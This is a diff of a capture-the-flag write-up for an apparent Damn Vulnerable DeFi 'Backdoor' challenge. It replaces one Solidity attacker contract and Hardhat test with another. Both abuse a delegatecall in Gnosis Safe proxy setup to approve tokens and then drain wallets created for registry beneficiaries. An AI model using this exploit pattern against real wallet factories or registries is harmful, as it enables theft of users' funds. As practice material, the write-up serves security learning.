@@ -13,71 +13,50 @@ This is really a difficult one so let us break it.
      */
 5. So let us check the createProxyWithCallback in GnosisSafeProxyFactory. As you can see we can set intializer in createProxyWithCallback function so what we will add ;) ?
 6. So now how we will break this contract?
-    * We will create a contract that with an exploit function
-    * The exploit function will call the setup method and since it has optional to parameter to make delegate call to a specific address and data also to make a delegate call so in the data we will call the approvefunction to approve ourself for spending the tokens.
-    * Then we will call the createProxyWithCallback and pass all parameters we need.
-    * Now we will transfer the dvt tokens to ourself.
+   We need to create a wallet for every user and set them as owner, then using the modules since it delegate a call, we can use it to approve our tokens, so by that we    can easily use transferFrom to our address. 
 
 ## Solution
 ```solidity
-import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
-import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
-import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
-import "../DamnValuableToken.sol";
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol"; 
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
 
-contract AttackBackdoor {
-    address public factory;
-    address public masterCopy;
-    address public walletRegistry;
-    IERC20 public token;
+contract BackdoorAttaker{
+    address public immutable masterCopy;
+    address public immutable walletFactory;
+    IERC20 public immutable token;
+    address public immutable walletRegistery;
+    uint public constant amount = 10*10**18; // every user has 10 token
 
-
-    constructor(
-        address _factory,
-        address _masterCopy,
-        address _walletRegistry,
-        address _token
-    ) {
-        factory = _factory;
-        masterCopy = _masterCopy;
-        walletRegistry = _walletRegistry;
-        token = IERC20(_token);
+    constructor(address _mastercopy,address _walletFactory,address _token,address _walletRegistery) 
+    {
+        masterCopy = _mastercopy;
+        walletFactory = _walletFactory;
+        token =IERC20(_token);
+        walletRegistery = _walletRegistery;
+    }
+    function approveDelegateCall(address _spender,address _token) external {
+        IERC20(_token).approve(_spender,amount);
     }
 
-    function approveWithDelegate(address _tokenAddress, address _attacker) external {
-        IERC20(_tokenAddress).approve(_attacker, 10 ether);
-    }
+    function attack(address[] memory beneficiaries) public 
+    {
+        for(uint i =0;i<beneficiaries.length;i++)
+        {
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = beneficiaries[i];
 
-    
-    function exploit(address[] memory users) external {
-        for (uint256 i = 0; i < users.length; i++) {
-            // Need to create a dynamically sized array for the user to meet signature req's
-            address[] memory owner = new address[](1);
-            owner[0] = users[i];
-
-            // Create ABI call for proxy
-            string
-                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
-            bytes memory initGnosis = abi.encodeWithSignature(
-                signatureString,
-                owner,
+            string memory signature = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
+            bytes memory init = abi.encodeWithSignature(signature, 
+                beneficiary,
                 1,
-                address(this),
-                abi.encodeWithSelector(AttackBackdoor.approveWithDelegate.selector,address(token),address(this)),
+                address(this),//msg.sender will be the proxy contract
+                abi.encodeWithSelector(BackdoorAttaker.approveDelegateCall.selector,address(this),address(token)),
                 address(0),
                 address(0),
                 0,
                 address(0)
             );
-
-            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
-                .createProxyWithCallback(
-                    masterCopy,
-                    initGnosis,
-                    123,
-                    IProxyCreationCallback(walletRegistry)
-                );
-
+            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(masterCopy,init,123,IProxyCreationCallback(walletRegistery));
             token.transferFrom(
                 address(newProxy),
                 msg.sender,
@@ -85,26 +64,21 @@ contract AttackBackdoor {
             );
         }
     }
-}
-```
-```javascript
-const attackerToken = this.token.connect(attacker);
-const attackerFactory = this.walletFactory.connect(attacker);
-const attackerMasterCopy = this.masterCopy.connect(attacker);
-const attackerWalletRegistry = this.walletRegistry.connect(attacker);
 
     
-// Deploy attacking contract
-const AttackModuleFactory = await ethers.getContractFactory("AttackBackdoor", attacker);
-const attackModule = await AttackModuleFactory.deploy(
-    attackerFactory.address,
-    ttackerMasterCopy.address,
-    attackerWalletRegistry.address,
-    attackerToken.address
-);
 
 
+}
 
-// Do exploit in one transaction (after contract deployment)
-await attackModule.exploit(users);
+```
+```javascript
+it('Exploit', async function () {
+        this.backdoorAttack = await (await ethers.getContractFactory('BackdoorAttaker', attacker)).deploy(
+            this.masterCopy.address,
+            this.walletFactory.address,
+            this.token.address,
+            this.walletRegistry.address
+        );
+        this.backdoorAttack.attack(users);
+    });
 ```
